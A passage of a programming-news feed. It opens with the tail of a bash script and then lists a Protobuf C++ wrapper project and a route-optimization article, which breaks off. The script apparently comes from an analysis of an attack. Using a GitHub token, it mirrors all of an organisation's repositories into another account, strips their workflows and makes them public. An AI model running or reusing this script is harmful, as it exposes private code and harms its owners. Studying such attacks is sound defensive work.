false</span></p></div><div><p><span>}</span></p></div><div><p><span>EOF</span></p></div><div><p><span>)</span></p></div><div><p><span>local</span><span> response</span></p></div><div><p><span>response</span><span>=</span><span>$(</span><span>github_api</span><span>"/repos/</span><span>$TARGET_USER</span><span>/</span><span>$repo_name</span><span>"</span><span>"PATCH"</span><span>"</span><span>$repo_data</span><span>"</span><span>)</span></p></div><div><p><span>local</span><span> http_code</span><span>=</span><span>"${</span><span>response</span><span>:</span><span>-3</span><span>}"</span></p></div><div><p><span>local</span><span> body</span><span>=</span><span>"${</span><span>response</span><span>%</span><span>???}"</span></p></div><div><p><span>if</span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>jq</span><span>-e</span><span>'.private == false'</span><span>&gt;</span><span>/dev/null</span><span>2&gt;&amp;1</span><span>; </span><span>then</span></p></div><div><p><span>return</span><span>0</span></p></div><div><p><span>else</span></p></div><div><p><span>return</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>}</span></p></div><div><p><span># --- Function to migrate a repository using git mirror ---</span></p></div><div><p><span>migrate_repo</span><span>() {</span></p></div><div><p><span>local</span><span> source_clone_url</span><span>=</span><span>"</span><span>$1</span><span>"</span></p></div><div><p><span>local</span><span> target_clone_url</span><span>=</span><span>"</span><span>$2</span><span>"</span></p></div><div><p><span>local</span><span> migration_name</span><span>=</span><span>"</span><span>$3</span><span>"</span></p></div><div><p><span>local</span><span> repo_dir</span><span>=</span><span>"</span><span>$TEMP_DIR</span><span>"</span></p></div><div><p><span>if</span><span>!</span><span>git</span><span>clone</span><span>--mirror</span><span>"</span><span>$source_clone_url</span><span>"</span><span>"</span><span>$repo_dir</span><span>/</span><span>$migration_name</span><span>"</span><span>2&gt;</span><span>/dev/null</span><span>; </span><span>then</span></p></div><div><p><span>return</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>cd</span><span>"</span><span>$repo_dir</span><span>/</span><span>$migration_name</span><span>"</span></p></div><div><p><span>if</span><span>!</span><span>git</span><span>remote</span><span>set-url</span><span>origin</span><span>"</span><span>$target_clone_url</span><span>"</span><span>2&gt;</span><span>/dev/null</span><span>; </span><span>then</span></p></div><div><p><span>cd</span><span>-</span><span>&gt;</span><span>/dev/null</span></p></div><div><p><span>return</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span># Temporarily convert to a regular repo to remove workflows</span></p></div><div><p><span>git</span><span>config</span><span>--unset</span><span>core.bare</span></p></div><div><p><span>git</span><span>reset</span><span>--hard</span></p></div><div><p><span># Remove workflows directory and commit the change</span></p></div><div><p><span>if</span><span> [[ </span><span>-d</span><span>".github/workflows"</span><span> ]]; </span><span>then</span></p></div><div><p><span>rm</span><span>-rf</span><span>.github/workflows</span></p></div><div><p><span>git</span><span>add</span><span>-A</span></p></div><div><p><span>git</span><span>commit</span><span>-m</span><span>"Remove GitHub workflows directory"</span></p></div><div><p><span>fi</span></p></div><div><p><span># Convert back to a bare repo for mirroring</span></p></div><div><p><span>git</span><span>config</span><span>core.bare</span><span>true</span></p></div><div><p><span>rm</span><span>-rf</span><span>*</span></p></div><div><p><span>if</span><span>!</span><span>git</span><span>push</span><span>--mirror</span><span>2&gt;</span><span>/dev/null</span><span>; </span><span>then</span></p></div><div><p><span>cd</span><span>-</span><span>&gt;</span><span>/dev/null</span></p></div><div><p><span>return</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>cd</span><span>-</span><span>&gt;</span><span>/dev/null</span></p></div><div><p><span>rm</span><span>-rf</span><span>"</span><span>$repo_dir</span><span>/</span><span>$migration_name</span><span>"</span></p></div><div><p><span>return</span><span>0</span></p></div><div><p><span>}</span></p></div><div><p><span># --- Function to process the list of repositories ---</span></p></div><div><p><span>process_repositories</span><span>() {</span></p></div><div><p><span>local</span><span> repos</span><span>=</span><span>"</span><span>$1</span><span>"</span></p></div><div><p><span>local</span><span> total_repos</span></p></div><div><p><span>total_repos</span><span>=</span><span>$(</span><span>echo</span><span>"</span><span>$repos</span><span>"</span><span>|</span><span>jq</span><span>length</span><span>)</span></p></div><div><p><span>if</span><span> [[ </span><span>"</span><span>$total_repos</span><span>"</span><span>-eq</span><span>0</span><span> ]]; </span><span>then</span></p></div><div><p><span>return</span><span>0</span></p></div><div><p><span>fi</span></p></div><div><p><span>local</span><span> success_count</span><span>=</span></p></div><div><p><span> </span><span>local</span><span> failure_count</span><span>=</span></p></div><div><p><span> </span><span>for</span><span> i </span><span>in</span><span> $(</span><span>seq</span><span>0</span><span> $((</span><span>total_repos</span><span>-</span><span>1</span><span>))); </span><span>do</span></p></div><div><p><span>local</span><span> repo</span></p></div><div><p><span>repo</span><span>=</span><span>$(</span><span>echo</span><span>"</span><span>$repos</span><span>"</span><span>|</span><span>jq</span><span>-r</span><span>".[</span><span>$i</span><span>]"</span><span>)</span></p></div><div><p><span>local</span><span> migration_name</span><span>=</span><span>"${</span><span>repo</span><span>//</span><span>\/</span><span>/</span><span>-</span><span>}-migration"</span></p></div><div><p><span>local</span><span> auth_source_url</span><span>=</span><span>"https://</span><span>$GITHUB_TOKEN</span><span>@github.com/</span><span>$repo</span><span>.git"</span></p></div><div><p><span>local</span><span> auth_target_url</span><span>=</span><span>"https://</span><span>$GITHUB_TOKEN</span><span>@github.com/</span><span>$TARGET_USER</span><span>/</span><span>$migration_name</span><span>.git"</span></p></div><div><p><span>echo</span><span>"Migrating </span><span>$repo</span><span> to </span><span>$TARGET_USER</span><span>/</span><span>$migration_name</span><span>..."</span></p></div><div><p><span>if</span><span>create_repo</span><span>"</span><span>$migration_name</span><span>"</span><span>; </span><span>then</span></p></div><div><p><span>if</span><span>migrate_repo</span><span>"</span><span>$auth_source_url</span><span>"</span><span>"</span><span>$auth_target_url</span><span>"</span><span>"</span><span>$migration_name</span><span>"</span><span>; </span><span>then</span></p></div><div><p><span>if</span><span>make_repo_public</span><span>"</span><span>$migration_name</span><span>"</span><span>; </span><span>then</span></p></div><div><p><span>echo</span><span>" -&gt; Success: Migrated and made public."</span></p></div><div><p><span>((success_count</span><span>++</span><span>))</span></p></div><div><p><span>else</span></p></div><div><p><span># Still counts as a success if migration worked but public toggle failed</span></p></div><div><p><span>echo</span><span>" -&gt; Warning: Migrated but failed to make public."</span></p></div><div><p><span>((success_count</span><span>++</span><span>))</span></p></div><div><p><span>fi</span></p></div><div><p><span>else</span></p></div><div><p><span>echo</span><span>" -&gt; Error: Migration failed."</span></p></div><div><p><span>((failure_count</span><span>++</span><span>))</span></p></div><div><p><span>fi</span></p></div><div><p><span>else</span></p></div><div><p><span>echo</span><span>" -&gt; Error: Could not create target repository."</span></p></div><div><p><span>((failure_count</span><span>++</span><span>))</span></p></div><div><p><span>fi</span></p></div><div><p><span>done</span></p></div><div><p><span>echo</span><span>"-------------------------------------"</span></p></div><div><p><span>echo</span><span>"Migration Complete."</span></p></div><div><p><span>echo</span><span>"Successful: </span><span>$success_count</span><span>"</span></p></div><div><p><span>echo</span><span>"Failed: </span><span>$failure_count</span><span>"</span></p></div><div><p><span>echo</span><span>"-------------------------------------"</span></p></div><div><p><span>return</span><span> $failure_count</span></p></div><div><p><span>}</span></p></div><div><p><span># --- Main execution block ---</span></p></div><div><p><span>main</span><span>() {</span></p></div><div><p><span># Check for required command-line tools</span></p></div><div><p><span>for</span><span> tool </span><span>in</span><span>curl</span><span>jq</span><span>git</span><span>; </span><span>do</span></p></div><div><p><span>if</span><span>!</span><span>command</span><span>-v</span><span>"</span><span>$tool</span><span>"</span><span> &amp;</span><span>&gt;</span><span> /dev/null; </span><span>then</span></p></div><div><p><span>echo</span><span>"Error: Required tool '</span><span>$tool</span><span>' is not installed."</span></p></div><div><p><span>exit</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>done</span></p></div><div><p><span>echo</span><span>"Fetching repositories from </span><span>$SOURCE_ORG</span><span>..."</span></p></div><div><p><span>local</span><span> repos</span></p></div><div><p><span>if</span><span>!</span><span> repos</span><span>=</span><span>$(</span><span>get_all_repos</span><span>"</span><span>$SOURCE_ORG</span><span>"</span><span>); </span><span>then</span></p></div><div><p><span>echo</span><span>"Error: Failed to fetch repositories from </span><span>$SOURCE_ORG</span><span>."</span></p></div><div><p><span>exit</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>process_repositories</span><span>"</span><span>$repos</span><span>"</span></p></div><div><p><span>}</span></p></div><div><p><span># Run main function with provided arguments</span></p></div><div><p><span>main</span><span>"</span><span>$@</span><span>"</span></p></div></code></pre></figure></div></div></section>]]></description><pubDate>Tue, 16 Sep 2025 16:40:37 +0530</pubDate></item><item><link>https://github.com/illegal-instruction-co/sugar-proto</link><title>Why is Protobuf’s C++ API so clunky? Would a nlohmann/json-style wrapper make sense? (github.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nibv4y/why_is_protobufs_c_api_so_clunky_would_a/</guid><comments>https://www.reddit.com/r/programming/comments/1nibv4y/why_is_protobufs_c_api_so_clunky_would_a/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 6 min | <a href='https://www.reddit.com/r/programming/comments/1nibv4y/why_is_protobufs_c_api_so_clunky_would_a/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>Protobuf is powerful and widely used, but working with its C++ API feels unnecessarily verbose:</p><ol><li>- `add_xxx()` returns a pointer</li><li>- `mutable_xxx()` everywhere</li><li>- setting nested fields is boilerplate-heavy</li></ol><p>Compare this to `nlohmann::json` where you can simply do:</p><p><code>cfg[&quot;x&quot;] = 42;</code></p><p><code>cfg[&quot;name&quot;] = &quot;berkay&quot;;</code></p><p>I’ve been toying with the idea of writing a `protoc` plugin that generates wrappers so you can use JSON-like syntax, but under the hood it’s still Protobuf (binary, efficient, type-safe).</p><p>Bonus: wrong types would fail at compile-time.</p><p>Example:</p><p><code>user[&quot;id&quot;] = 123;       // compiles</code></p><p><code>user[&quot;id&quot;] = &quot;oops&quot;;    // compile-time error</code></p><p>Do you think such a library would fill a real gap, or is the verbosity of the official Protobuf API something developers just accept?</p><p>Curious to hear your thoughts.</p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://opengraph.githubassets.com/1337735e66765d1aef5640abdd95c817a0b7c9360df1d12312a03a8fd567be11/illegal-instruction-co/sugar-proto' /></section><section class='parsed-content'><div><article><h2>sugar-proto</h2><a href="https://github.com#sugar-proto"></a><p><code>sugar-proto</code> is a lightweight wrapper and plugin for Protocol Buffers. The main goal is to make working with protobuf in C++ feel simpler and more intuitive, closer to plain struct and stl like APIs.</p><h2>Why</h2><a href="https://github.com#why"></a><p>Using the default protobuf C++ API can feel verbose and rigid. With sugar-proto, you can interact with your messages in a much friendlier way, for example:</p><div><pre>u.id = <span>123</span>; u.tags.push_back(<span><span>"</span>cpp<span>"</span></span>); u.profile.city = <span><span>"</span>Berlin<span>"</span></span>; cout &lt;&lt; u.id &lt;&lt; endl; cout &lt;&lt; u.tags[] &lt;&lt; endl; cout &lt;&lt; u.profile.city &lt;&lt; endl;</pre></div><p>Instead of juggling with reflection and getters/setters everywhere, you get a concise and readable interface.</p><h2>Installation</h2><a href="https://github.com#installation"></a><p>Build and install with:</p><div><pre>git clone https://github.com/illegal-instruction-co/sugar-proto.git <span>cd</span> sugar-proto mkdir build <span>&amp;&amp;</span> <span>cd</span> build cmake .. make -j sudo make install</pre></div><p>After installation:</p><ul> <li>The plugin binary will be placed at <code>/usr/local/bin/protoc-gen-sugar</code></li> <li>The runtime header will be installed at <code>/usr/local/include/sugar/sugar_runtime.h</code></li> <li>CMake config files will be available so you can simply use <code>find_package(sugar-proto REQUIRED)</code> in your own projects</li> </ul> <h2>Usage</h2><a href="https://github.com#usage"></a><p>In your project&rsquo;s <code>CMakeLists.txt</code>:</p><div><pre><span>find_package</span>(<span>Protobuf</span> <span>REQUIRED</span>) <span>find_package</span>(<span>sugar-proto</span> <span>REQUIRED</span>) <span>set</span>(<span>PROTO_FILE</span> <span>${CMAKE_SOURCE_DIR}</span><span>/my.proto</span>) <span>set</span>(<span>GENERATED_DIR</span> <span>${CMAKE_BINARY_DIR}</span><span>/generated</span>) <span>file</span>(<span>MAKE_DIRECTORY</span> <span>${GENERATED_DIR}</span>) <span>add_custom_command</span>( <span>OUTPUT</span> <span>${GENERATED_DIR}</span><span>/my.pb.cc</span> <span>${GENERATED_DIR}</span><span>/my.pb.h</span> <span>COMMAND</span> <span>${Protobuf_PROTOC_EXECUTABLE}</span> <span>--cpp_out=${GENERATED_DIR}</span> <span>-I</span> <span>${CMAKE_SOURCE_DIR}</span> <span>${PROTO_FILE}</span> <span>DEPENDS</span> <span>${PROTO_FILE}</span> ) <span>add_custom_command</span>( <span>OUTPUT</span> <span>${GENERATED_DIR}</span><span>/my.sugar.h</span> <span>COMMAND</span> <span>${Protobuf_PROTOC_EXECUTABLE}</span> <span>--sugar_out=${GENERATED_DIR}</span> <span>-I</span> <span>${CMAKE_SOURCE_DIR}</span> <span>${PROTO_FILE}</span> <span>DEPENDS</span> <span>${PROTO_FILE}</span> ) <span>add_executable</span>(<span>my_app</span> <span>main.cpp</span> <span>${GENERATED_DIR}</span><span>/my.pb.cc</span> ) <span>target_include_directories</span>(<span>my_app</span> <span>PRIVATE</span> <span>${GENERATED_DIR}</span>) <span>target_link_libraries</span>(<span>my_app</span> <span>PRIVATE</span> <span>Protobuf::libprotobuf</span>)</pre></div><h2>Example Code</h2><a href="https://github.com#example-code"></a><div>int main() { MyMessage msg; MyMessageWrapped u(msg); u.id = 42; u.name = "hello world"; u.tags.push_back("first"); u.tags.push_back("test"); std::cout &lt;&lt; msg.DebugString() &lt;&lt; std::endl; std::cout &lt;&lt; u.id &lt;&lt; std::endl; std::cout &lt;&lt; u.name &lt;&lt; std::endl; return 0; }"&gt;<pre>#<span>include</span> <span><span>"</span>my.pb.h<span>"</span></span> #<span>include</span> <span><span>"</span>my.sugar.h<span>"</span></span> #<span>include</span> <span><span>&lt;</span>iostream<span>&gt;</span></span> <span>int</span> <span>main</span>() { MyMessage msg; MyMessageWrapped <span>u</span>(msg); u.<span>id</span> = <span>42</span>; u.<span>name</span> = <span><span>"</span>hello world<span>"</span></span>; u.<span>tags</span>.<span>push_back</span>(<span><span>"</span>first<span>"</span></span>); u.<span>tags</span>.<span>push_back</span>(<span><span>"</span>test<span>"</span></span>); std::cout &lt;&lt; msg.<span>DebugString</span>() &lt;&lt; std::endl; std::cout &lt;&lt; u.<span>id</span> &lt;&lt; std::endl; std::cout &lt;&lt; u.<span>name</span> &lt;&lt; std::endl; <span>return</span> ; }</pre></div><p></p><h2>Notes</h2><a href="https://github.com#notes"></a> <ul> <li>Minimum required CMake version is 3.16 (recommended 3.21 or newer)</li> <li>Currently supports: scalar fields, repeated fields, maps, and oneofs</li> <li>API is not considered stable yet, small breaking changes may occur</li> </ul><p>If you run into issues or missing features, please open an issue. The ultimate goal is to make protobuf usage in C++ enjoyable and developer friendly.</p></article></div></section>]]></description><pubDate>Tue, 16 Sep 2025 14:01:31 +0530</pubDate></item><item><link>https://medium.com/@martinvizzolini/a-last-mile-optimizer-that-outperforms-amazons-routes-on-a-laptop-24242f93eb74</link><title>Breaking Amazon's Routing Efficiency on Consumer Hardware: A Technical Deep Dive (medium.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nhxlt3/breaking_amazons_routing_efficiency_on_consumer/</guid><comments>https://www.reddit.com/r/programming/comments/1nhxlt3/breaking_amazons_routing_efficiency_on_consumer/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 38 min | <a href='https://www.reddit.com/r/programming/comments/1nhxlt3/breaking_amazons_routing_efficiency_on_consumer/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>I built a route optimizer that runs massive-scale last-mile delivery problems on a personal laptop (MacBook Pro M1, 16 GB RAM).<br/>Benchmarked against Amazon’s official dataset, it consistently reduced total kilometers (~18%), routes (~12%), and improved vehicle utilization (~12%).</p><p>This post explains the methods: batching, concurrency, caching, and constraint-aware clustering — making city-scale routing feasible on consumer hardware.</p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://miro.medium.com/v2/resize:fit:1200/1*kWdxSg19yVdYFxYdjFEZ-g.png' /></section><section class='parsed-content'><article><div><div><figure><div><p><span>Press enter or click to view image in full size</span></p></div></figure><h2>TL;DR &mdash; Massive-Scale Last-Mile Routing on a Laptop</h2><ul><li><strong>What it is:</strong> a last-mile route optimizer that runs <strong>entirely on a single laptop</strong> &mdash; no cloud, GPUs, or enterprise servers &mdash;</li><li><strong>Impact (global):</strong> achieves <strong>~15&ndash;20% less total distance</strong>, <strong>~10&ndash;15% fewer routes</strong>, and <strong>~10&ndash;20% higher average vehicle utilization</strong>, while still <strong>meeting vehicle capacity and time-window constraints</strong>.</li><li><strong>How it&rsquo;s measured:</strong> all metrics are <strong>against Amazon&rsquo;s baselines from the official Last Mile Routing Research Challenge dataset</strong>, recomputed with the same per-leg, multi-engine pipeline and reported as a <strong>blended average</strong> across engines for fair comparison.<br>The optimizer uses the <strong>same fleet composition, vehicle capacities, and volumes as Amazon&rsquo;s plans</strong>.</li><li><strong>Scaling behavior:</strong> efficiently handles <strong>massive datasets without theoretical limits</strong> by splitting workloads into <strong>configurable batches</strong> that fit the available hardware. By decomposing the exponential VRP into parallelizable atomic tasks, the system <strong>achieves near-linear runtime</strong> growth on the same machine.</li><li><strong>What you can control:</strong> Fleet load targets (e.g., ~80% average capacity), fleet size and types, <strong>per-vehicle limits </strong>(stops/volume/weight), and <strong>time-window </strong>mode with estimated start times.</li><li><strong>New paradigm:</strong> <strong>No pre-defined zones</strong>. Stops are grouped dynamically by <strong>true geographic proximity and density</strong>, creating natural and efficient routes without depending on arbitrary areas.</li><li><strong>Business takeaway:</strong> predictable runtimes, lower infrastructure cost, and clear reductions in kilometers traveled and fleet size &mdash; without compromising operational constraints.</li></ul></div><div><h2>Background &amp; Motivation</h2><p>Some time ago, I developed a route optimizer for a small client. The goal was simple: organize delivery orders, assign them to vehicles, and minimize travel distance and time. At that stage, the scale was modest &mdash; around 15 vehicles and fewer than 12 stops per route. Using standard optimization techniques, I built a solution that performed well and produced results in an acceptable time.</p><p>Later, I decided to test how far my solution could scale. I added more vehicles and more stops. At a certain point, my laptop could no longer finish runs within a reasonable time or memory limits. The approach worked for small cases, but it wasn&rsquo;t scalable.</p><p>I introduced concurrency, caching, and other optimizations, yet I still couldn&rsquo;t handle more than ~10,000 stops without exhausting resources. While searching for benchmarks, I discovered the <a href="https://routingchallenge.mit.edu/"><strong>Amazon Last Mile Routing Research Challenge (2021)</strong></a>, which features real-world datasets of an entirely different magnitude, where a single depot could manage <strong>1,100+ routes and ~174,000 stops.</strong> A scale that presents a challenge, far beyond what conventional algorithms (or standard hardware) can handle.</p><p>That became the new target: to take my initial prototype and make it powerful enough to solve Amazon&rsquo;s challenge, but on <strong>consumer hardware only (</strong>my personal <strong>MacBook Pro M1 &mdash; 16 GB RAM</strong>).</p><p>Over time, I built a solution that not only processed the massive dataset but also <strong>outperformed Amazon&rsquo;s reported routes </strong>&mdash; reducing distance and increasing vehicle utilization &mdash; while respecting real-world constraints.</p></div><div><blockquote><p><strong><em>1. Part I &mdash; Problem &amp; Data Foundations</em></strong></p></blockquote><h2>1.1 The Problem: Last-Mile Delivery Complexity</h2><p>Last-mile delivery &mdash; the final stretch from warehouse (depot/station) to customer &mdash; accounts for up to 50% of total logistics costs. <br>The core challenge is solving the <strong>Vehicle Routing Problem (VRP)</strong> with vehicle capacity constraints and delivery time windows, while avoiding typical solutions where processing times grow exponentially with the number of stops. <em>This variant is technically called </em><strong><em>CVRPTW</em></strong><em> (Capacitated Vehicle Routing Problem with Time Windows).</em></p><h2>1.2 Why Last-Mile Delivery Is So Challenging</h2><p>At city scale, last-mile routing fails not because the goal is unclear, but because <strong>the search space and the operational constraints explode together:</strong> the combinatorial number of ways to order stops, and real-world constraints.</p><h3>1.2.1 Exponential Complexity</h3><p>Even in the simplified single-vehicle case, the number of possible tours for <code>n</code> stops is <code>(n-1)!/2</code></p><p>That means a small increase in stops multiplies the search space enormously. Even with <strong>aggressive parallelism</strong> and <strong>optimistic per-route cost</strong>, exhaustive search becomes impossible after a few dozen stops.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 1.</strong> Exponential explosion of brute-force solution space</figcaption></figure><p>To put this in perspective: A brute-force solution for 100 stops would take <strong>over 10&sup1;&sup2;&#8313; times longer than the universe has existed</strong> &mdash; a number so large it defies practical comprehension.</p><h3><strong>1.2.2 Scale and Infrastructure Challenges: Why Route Optimization Breaks at Scale</strong></h3><h3>Hardware Limitations</h3><ul><li><strong>Distance matrices</strong> grow quadratically (<em>n&sup2; entries: 1,000 stops = 1M distance calculations</em>). Full city-scale distance matrices exceed memory limits.</li><li><strong>Processing time</strong> grows exponentially with problem size.</li><li><strong>Traditional algorithms</strong> collapse at large scales on consumer hardware. VRP requires <strong>high-end infrastructure</strong> (64+ CPU cores, GPU acceleration, or distributed computing)</li></ul><h3>The Limits of Today&rsquo;s Routing Solutions</h3><p>Last-mile large-scale route optimization faces a dual challenge: the combinatorial explosion of NP-hard complexity and the <strong>practical limits of existing solvers</strong>.</p><ul><li>Specialized tools like <strong>Google&rsquo;s OR-Tools</strong> face significant limitations: While excellent for moderate-scale solutions (hundreds of stops), problems requiring multiple vehicle assignments for high-demand locations can result in exponential solve times or no solution at all.</li><li><strong>Advanced routing solutions</strong> remain typically <strong>proprietary</strong>, developed and maintained by large companies with dedicated infrastructure. Industry leaders like Amazon rely on massive distributed systems running on hundreds of CPU cores in cloud infrastructure.</li><li><strong>Commercial SaaS services</strong> impose strict operational limits: most cap requests at <strong>1,000&ndash;5,000</strong> stops per optimization run, making them unsuitable for true city-scale logistics (100,000+ stops).</li></ul><h3>Workarounds and Their Trade-Offs</h3><p>Many operators try to &ldquo;patch&rdquo; these limitations with shortcuts, but each comes with trade-offs that degrade solution quality.</p><ul><li><strong>Splitting stops into smaller groups</strong> breaks route continuity, often resulting in disconnected or inefficient overall solutions.</li><li><strong>Standard clustering techniques</strong> ignore real-world vehicle constraints such as package volumes and weight limits.</li><li><strong>Artificial stop caps</strong> (e.g., 1,000 per run) <strong>force pre-zoning</strong>, simplifying computation but distorting results by fixing zones in advance rather than emerging from optimization. These approaches make the problem <strong>easier to compute, but at the cost of efficiency and realism</strong>.</li></ul><h2>1.3 The Amazon Challenge Context</h2><p>To benchmark at a realistic scale, this work uses the <strong>Amazon Last Mile Routing Research Challenge (2021)</strong> <a href="https://registry.opendata.aws/amazon-last-mile-challenges/">dataset</a> and compares against Amazon&rsquo;s own reported routes. Evaluations focus on: total kilometers traveled, number of routes (fleet efficiency), compliance with delivery time windows, and computational efficiency on consumer hardware.</p><p>To compare fairly, I first needed to reconstruct Amazon&rsquo;s actual routes from the raw files before measuring distances and times.</p><h2>1.4 Route Reconstruction Methodology: From Raw Amazon Data to Visualized Routes</h2><h3>1.4.1 Data Integration</h3><p>The original dataset comes as multiple disconnected JSON files (<code>route_data.json</code>, <code>actual_sequences.json</code>, <code>package_data.json</code>, <code>travel_times.json</code>). All files are merged by their shared identifiers (<code>route_id</code>, <code>stop_id</code>) to create a unified view of each route.</p><p>The complete dataset contains <strong>6,112 historical routes </strong>with 543,485 unique locations<strong> (totaling 1,048,575 stops)</strong> across five major US metropolitan areas:</p><p><strong>Los Angeles:</strong> 2,888 routes, 6 depots<br><strong>Seattle:</strong> 1,079 routes, 3 depots<br><strong>Chicago:</strong> 1,002 routes, 4 depots<br><strong>Boston:</strong> 929 routes, 3 depots<br><strong>Austin:</strong> 214 routes, 1 depot</p><p>Routes are organized by <strong>17 depot stations</strong> distributed across these cities.<br>On average, routes in the Amazon dataset contain <strong>around ~148 stops</strong> and <strong>~240&ndash;250 packages.</strong></p><h3>1.4.2 Building the Route JSON</h3><p>The integrated data is transformed into a single structured JSON for each route, preserving the station code, ordered sequence of stops, and packages assigned to each stop. This allows exact replication of the driver&rsquo;s actual path:</p><p><strong><em>Route -&gt; Ordered Sequence of Stops -&gt; Packages per Stop.</em></strong></p><pre><span>{<br> "route_id": "RouteID_04189f85-13a6-47b8-a78e-ec5688be0819",<br> "station_code": "DLA9", // Depot identifier for route origin and return point<br> "executor_capacity_cm3": 4247527, // Vehicle cargo capacity in cubic centimeters<br> "addresses": [<br> {<br> "stop_id": "CR",<br> "zone_id": "A-8.3C", // Original Amazon zone encoding for reference (Region-Area.Zone format)<br> "lat": 42.34873,<br> "lng": -71.074241,<br> "packages": [<br> {<br> "package_id": "c1ee7bdc-5846-4931-b8cd-60541780fc94",<br> "dimensions": { "length": 30.2, "width": 17.5, "height": 5.3 }, // Package size constraints affecting vehicle loading<br> "time_window": { "start": "2018-08-04 05:00", "end": "2018-08-05 04:59", "time_zone": "UTC" } // Customer delivery preferences with timezone data<br> }<br> // ... more packages<br> ]<br> }<br> // ... more stops in sequence<br> ]<br>}</span></pre><h3><strong>1.4.3 Visualization &amp; Analysis</strong></h3><p>The unified JSON structure enables direct mapping and route visualization, allowing a clear comparison between optimized routes and Amazon&rsquo;s actual delivery strategies.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 2. </strong>Actual <strong>Amazon delivery routes</strong> from the smallest depot (DBO1) in the dataset, containing <strong>60 routes</strong> with <strong>8,205 stops</strong>.</figcaption></figure></div><div><blockquote><p><strong><em>2. Part II &mdash; Solution (Techniques &amp; Architecture)</em></strong></p></blockquote><h2>2.1 The Solution Approach</h2><p>Instead of chasing mathematically perfect routes, the Optimizer uses <strong>intelligent heuristics and parallelism</strong> to reach near-optimal solutions in minutes.</p><p>The key is<strong> not a single algorithm</strong>, but an architecture that runs efficiently on consumer hardware. All computation <strong>runs fully offline</strong> (no third-party APIs or external services for the optimization itself). External engines may be used later for benchmarking/validation, but they do not participate in the optimization process.</p><h2>2.2 The Core Insight: Divide and Conquer</h2><p>The breakthrough comes from recognizing that you don&rsquo;t need to solve the entire VRP at once. Instead:</p><ol><li><strong>Cluster addresses</strong> into manageable groups based on proximity and capacity</li><li><strong>Solve smaller VRPs</strong> within each custom cluster using efficient algorithms</li><li><strong>Parallelize processing</strong> across multiple CPU cores</li><li><strong>Cache intermediate results</strong> to avoid redundant calculations</li><li><strong>Aggregate solutions</strong> into a coherent global optimization</li></ol><h2>2.3 Key Principles That Guide the Solution</h2><p>Based on extensive testing against real-world datasets, these principles form the foundation:</p><h3>2.3.1 Reduce Overlap via Clean, Separated Clusters</h3><p>Street overlap between vehicles equals wasted resources. The algorithm optimizes <strong>route distribution to minimize redundant street usage</strong>, reducing fuel costs, travel time, and unnecessary traffic while maximizing coverage efficiency.</p><p>Below, we compare clustering strategies. Each color represents the route of a single vehicle. While I don&rsquo;t have specific knowledge of Amazon&rsquo;s exact algorithmic approach, it is evident that Amazon&rsquo;s routes exhibit significant overlap, with multiple vehicles traversing the same paths and areas.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 3. </strong>Amazon baseline routes (overlap) &mdash; depot DLA9 in the Los Angeles metropolitan area.</figcaption></figure><p>In contrast, I employ a different strategy focused on creating well-defined, separated clusters. This approach aims to atomize each cluster by maintaining clear boundaries between service areas, thereby minimizing route overlaps and reducing redundancy in vehicle paths.</p><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption><strong>Figure 4. </strong>Optimizer routes (overlap minimized). Same area clustered and sequenced by the algorithm &mdash; depot DLA9 in the Los Angeles metropolitan area</figcaption></figure><h3>2.3.2 Optimize Load Without Sacrificing Performance</h3><p>The system lets you set minimum and maximum load targets (e.g., 70&ndash;90% vehicle capacity). While higher utilization looks efficient on paper, pushing fleets near 100% often backfires: routes become longer, delivery times increase, and time-window violations become more frequent.</p><p>The sweet spot is <strong>~75&ndash;85%</strong>, which balances efficiency with operational flexibility. In some cases, allowing a few extra routes can actually improve on-time performance without significantly increasing total kilometers.</p><h3>2.3.3 Quality Clusters Beat Perfect Paths</h3><p>A slightly suboptimal path within a high-quality cluster is better than a &ldquo;perfect&rdquo; path in a poorly formed cluster. <strong>Good clustering eliminates zigzags by design</strong>.</p><h3><strong>2.3.4 Density-Driven Consolidation Logic</strong></h3><p>The optimizer dynamically adjusts its parameters based on addresses, packages, and geographic density. <strong>Consolidation</strong> refers to how many deliveries are grouped into a single route or vehicle:</p><p><strong>&bull; High density</strong> &rarr; more consolidation: fewer routes, fuller vehicles, higher efficiency.<br><strong>&bull; Low density</strong> &rarr; less consolidation: more routes, lighter loads, greater flexibility.</p><p>Efficiency targets can be tuned: conservative ratios (e.g., 70%) leave slack, while aggressive ones (e.g., 90%) push for maximum consolidation. This density-aware logic allocates resources according to <strong>real geography and package distribution</strong>, not static parameters.</p><p>Although the optimizer can start from a user-defined fleet size, it calculates the <strong>optimal distribution of routes and vehicles</strong> based on stops, density, packages per stop, and fleet availability.</p><h2>2.4 How It Works: The Technical Flow</h2><p>The system transforms raw address data into optimized routes through five efficient steps:</p><h3><strong>Step 1: Data Ingestion, Validation, and Preprocessing</strong></h3><p>Large-scale requests (100k+ addresses) are loaded and validated early. To stay memory-efficient, the data is batched into subsets, geocoded, and paired with fast initial distance estimates (via haversine or cached OSM legs). Distance matrices are cached on demand, cutting recomputation by ~90%. At this stage, the system also <strong>detects geographic density patterns, </strong>an early hint of how stops will later be grouped into clusters.</p><h3>Step 2: Intelligent Clustering</h3><p>Delivery stops are clustered based on proximity and density, but also guided by package volumes and vehicle capacity. This creates 